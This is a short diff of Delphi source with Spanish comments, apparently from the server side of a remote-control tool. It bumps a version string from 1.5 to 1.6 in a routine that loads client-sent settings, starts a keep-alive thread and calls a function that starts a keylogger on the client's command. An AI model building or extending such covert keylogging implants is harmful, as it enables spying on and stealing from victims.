@@ -1197,7 +1197,7 @@ const
   procedure CargarServidor(P:Pointer);
   begin
     Configuracion := TSettings(P^); //Leemos la configuración que nos han mandado
-    VersionDelServer := '1.5';
+    VersionDelServer := '1.6';
     BeginThread(nil,0,Addr(KeepAliveThread),nil,0,id1);
     OnServerInitKeylogger(); //Función que inicia el keylogger en caso de que se haya iniciado antes desde el cliente o en el futuro si la configuración lo marca
   
